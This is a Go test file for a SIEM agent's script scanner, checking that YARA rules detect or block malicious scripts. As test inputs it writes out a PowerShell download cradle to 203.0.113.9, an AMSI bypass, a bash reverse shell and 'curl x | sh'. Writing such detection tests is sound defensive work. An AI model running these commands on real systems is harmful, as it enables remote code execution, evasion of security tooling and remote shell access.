package scriptscan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/siem-platform/agent/internal/yarascan"
)

const (
	cradle  = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"
	bypass  = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
	revsh   = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
	harmles = "Get-ChildItem C:\\Users | Sort-Object Name"
)

// The built-in pack (yara/builtin), as the server seeds it.
func builtinYara(t *testing.T) *yarascan.Scanner {
	t.Helper()
	files, _ := filepath.Glob(filepath.Join("..", "..", "..", "yara", "builtin", "*.yar"))
	var rules []yarascan.Rule
	for _, f := range files {
		b, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		rules = append(rules, yarascan.Rule{Name: "builtin/" + strings.TrimSuffix(filepath.Base(f), ".yar"), Content: string(b)})
	}
	s := yarascan.New(yarascan.Options{Roots: []string{t.TempDir()}, Push: func(string, string) {}})
	if errs := s.SetRules("pack", rules); len(errs) != 0 {
		t.Fatal(errs)
	}
	return s
}

type out struct {
	mu    sync.Mutex
	lines []string
}

func (o *out) push(_, l string) { o.mu.Lock(); o.lines = append(o.lines, l); o.mu.Unlock() }
func (o *out) all() []string {
	o.mu.Lock()
	defer o.mu.Unlock()
	return append([]string(nil), o.lines...)
}

func TestScanReportsAndBlocks(t *testing.T) {
	var o out
	action := "detect"
	var killed []uint32
	excluded := ""
	s := &Scanner{Yara: builtinYara(t), Push: o.push, Action: func() string { return action },
		Kill:     func(pid uint32) error { killed = append(killed, pid); return nil },
		Excluded: func(image, name, sha string) bool { return image == excluded }, Self: 1}
	ctx := context.Background()
	ps := `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	app := `PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.19041.1`

	s.scan(ctx, Script{PID: 100, Image: ps, App: app, Content: []byte(cradle)})
	s.scan(ctx, Script{PID: 101, Image: ps, App: app, Content: []byte(cradle)}) // same content: once
	s.scan(ctx, Script{PID: 102, Image: ps, App: app, Content: []byte(harmles)})
	got := o.all()
	if len(got) != 1 || !strings.Contains(got[0], "event=script_scan action=detected") ||
		!strings.Contains(got[0], "builtin/scripts_loaders/ADSIEM_Script_PowerShell_Download_Cradle") ||
		!strings.Contains(got[0], "DownloadString") || len(killed) != 0 {
		t.Fatalf("detect: %q killed=%v", got, killed)
	}

	action = "block"
	s.scan(ctx, Script{PID: 200, Image: ps, App: app, Content: []byte(bypass)})
	got = o.all()
	if len(got) != 2 || !strings.Contains(got[1], "action=terminated") || len(killed) != 1 || killed[0] != 200 {
		t.Fatalf("block: %q killed=%v", got, killed)
	}

	excluded = "/opt/admin/bin/bash"
	s.scan(ctx, Script{PID: 300, Image: excluded, App: "bash", Content: []byte(revsh)})
	if len(o.all()) != 2 {
		t.Fatal("an excluded host program is not scanned")
	}
	excluded = ""
	s.scan(ctx, Script{PID: 301, Image: "/usr/bin/bash", App: "bash", Content: []byte(revsh + " ")})
	if l := o.all(); len(l) != 3 || !strings.Contains(l[2], `app="bash"`) {
		t.Fatalf("reverse shell: %q", l)
	}

	action = "off"
	before := len(o.all())
	s.Offer(Script{PID: 400, Content: []byte(cradle + " x")})
	if len(s.queue) != 0 || len(o.all()) != before {
		t.Fatal("off: nothing queued")
	}
}

func TestRunQueuesAndDropsWhenFull(t *testing.T) {
	var o out
	s := &Scanner{Yara: builtinYara(t), Push: o.push, Self: 1}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go s.Run(ctx)
	s.Offer(Script{PID: 5, Image: "/usr/bin/bash", App: "bash", Content: []byte(revsh)})
	s.Offer(Script{PID: 1, Image: "/usr/bin/bash", Content: []byte(revsh)}) // the agent itself
	for deadline := time.Now().Add(3 * time.Second); len(o.all()) == 0 && time.Now().Before(deadline); {
		time.Sleep(10 * time.Millisecond)
	}
	if len(o.all()) != 1 {
		t.Fatalf("queued scan: %q", o.all())
	}
}

func TestFromExec(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "drop.py")
	os.WriteFile(script, []byte("import socket,subprocess\n"), 0o644)
	cases := []struct {
		image string
		args  []string
		want  string
		ok    bool
	}{
		{"/usr/bin/bash", []string{"bash", "-c", "curl x | sh"}, "curl x | sh", true},
		{"/bin/sh", []string{"sh", "-ec", "id"}, "id", true},
		{"/usr/bin/python3.11", []string{"python3", "-u", script}, "import socket", true},
		{"/usr/bin/perl", []string{"perl", "-e", "print 1"}, "print 1", true},
		{"/usr/bin/php8.2", []string{"php", "-r", "system('id');"}, "system", true},
		{"/usr/bin/bash", []string{"bash"}, "", false},               // stdin
		{"/usr/bin/ls", []string{"ls", "-la"}, "", false},            // not an interpreter
		{"/usr/bin/bash", []string{"bash", "/nope/x.sh"}, "", false}, // gone
		{"/usr/bin/bash", []string{"bash", "-c"}, "", false},         // no code
	}
	for i, c := range cases {
		sc, ok := FromExec(10, c.image, c.args)
		if ok != c.ok || (ok && !strings.Contains(string(sc.Content), c.want)) {
			t.Errorf("case %d: ok=%v content=%q", i, ok, sc.Content)
		}
	}
	if sc, _ := FromExec(10, "/usr/bin/python3", []string{"python3", script}); sc.Name != script {
		t.Fatalf("the script file is named: %q", sc.Name)
	}
}

func TestExcerptIsShortAndClean(t *testing.T) {
	long := strings.Repeat("A", 500) + "\x00\x01" + cradle + strings.Repeat("B", 500)
	var o out
	s := &Scanner{Yara: builtinYara(t), Push: o.push}
	s.scan(context.Background(), Script{PID: 7, Image: "x", App: "PowerShell", Content: []byte(long)})
	l := o.all()
	if len(l) != 1 {
		t.Fatalf("lines %q", l)
	}
	ex := l[0][strings.Index(l[0], `excerpt="`)+9:]
	ex = ex[:strings.Index(ex, `"`)]
	if len(ex) > excerptLen || strings.ContainsAny(ex, "\x00\x01") || !strings.Contains(ex, "New-Object") {
		t.Fatalf("excerpt %q", ex)
	}
}
